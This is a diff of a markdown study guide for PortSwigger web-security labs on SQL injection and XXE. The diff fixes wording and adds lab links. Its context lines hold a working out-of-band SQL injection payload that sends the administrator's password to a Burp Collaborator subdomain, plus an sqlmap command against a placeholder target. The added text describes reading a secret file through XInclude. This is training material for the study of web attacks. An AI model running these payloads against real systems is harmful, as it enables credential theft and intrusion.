@@ -329,7 +329,7 @@ Connection: close
 
 ![Identify the input parameter vulnerable to SQL injection](identify-sqli-parameter.png)  
 
->Out of band data exfiltration SQL query, suck as a tracking cookie.  
+>Out of band data exfiltration SQL query, namely a tracking cookie.  
 
 ```sql
 TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
@@ -381,7 +381,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 >File upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.  
 
-### Identify
+### Identify XML
 
 >Possible to find XXE attack surface in requests that do not contain any XML.  
 
@@ -420,10 +420,14 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 ![Exploiting blind XXE to exfiltrate data usding a mlicious exploit DTD file](blind-xxe-exploit-dtd.png)  
 
+[PortSwigger Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)  
+
 ### Xinclude file read  
 
->To be completed...  
+>Webapp **Check Stock** feature use server-side XML document that is parsed, but because the entire XML documentcannot be defined a DTD file cannot be used. Injecting an **XInclude** statement to retrieve the contents of /home/carlos/secret file is possible.  
 
+
+[PortSwigger Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)  
 
 
 ### SQL + XML + HackVector 
